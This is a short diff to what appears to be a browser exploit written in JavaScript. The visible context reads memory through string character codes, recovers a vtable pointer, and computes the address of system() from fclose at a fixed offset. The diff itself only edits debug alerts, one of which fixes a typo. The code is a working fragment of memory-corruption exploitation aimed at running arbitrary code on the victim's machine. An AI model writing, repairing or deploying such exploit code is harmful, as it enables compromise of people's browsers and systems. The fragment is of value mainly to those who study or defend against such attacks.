@@ -1,5 +1,5 @@
 <script>	
-alert("start9");
+alert("start8");
 function func2(){
 for(var i=0;i<0x1000;i++){ 
 
@@ -148,7 +148,7 @@ var vftable=s1.charCodeAt(a)+(s1.charCodeAt(a+1)<<16);
 a=(vftable+0xF4E4C)/2;
 var fclose_addr=s1.charCodeAt(a)+(s1.charCodeAt(a+1)<<16);
 var system_addr=fclose_addr-0x1B040;
-alert(system._addr.toString(16));
+alert(system_addr.toString(16));
 a=(func_addr+0x30)/2;
 var p_addr=s1.charCodeAt(a)+(s1.charCodeAt(a+1)<<16);
 a=(p_addr+0x10)/2;
